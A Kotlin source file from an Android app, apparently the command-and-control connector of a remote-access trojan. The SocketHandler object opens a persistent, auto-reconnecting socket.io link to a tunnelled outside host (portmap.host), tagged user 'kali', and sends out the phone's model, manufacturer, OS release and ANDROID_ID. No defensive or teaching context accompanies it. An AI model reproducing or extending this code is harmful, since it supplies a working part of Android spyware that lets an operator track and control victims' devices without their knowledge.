package com.neaking
import android.annotation.SuppressLint
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import java.net.URISyntaxException

object SocketHandler {

     lateinit var mSocket: Socket

    @SuppressLint("HardwareIds")
    @Synchronized
    fun setSocket() {
        try {
          val deviceID = Settings.Secure.getString(
                MainService.getContextOfApplication()?.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            val uri="http://androidramview-20513.portmap.host:20513?model=" + Uri.encode(Build.MODEL) + "&user="+"kali"+ "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + deviceID
           // val uri="http://192.168.0.202:22222?model=" + Uri.encode(Build.MODEL) + "&user="+"kali"+ "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + deviceID
            val opts: IO.Options = IO.Options()
            opts.reconnection = true
            opts.reconnectionDelay = 5000
            opts.reconnectionDelayMax = 999999999
            mSocket = IO.socket(uri)

        } catch (_: URISyntaxException) {

        }
    }

    @Synchronized
    fun getSocket(): Socket {
        return mSocket
    }

    @Synchronized
    fun establishConnection() {
        mSocket.connect()

    }

    @Synchronized
    fun closeConnection() {
        mSocket.disconnect()
    }
}
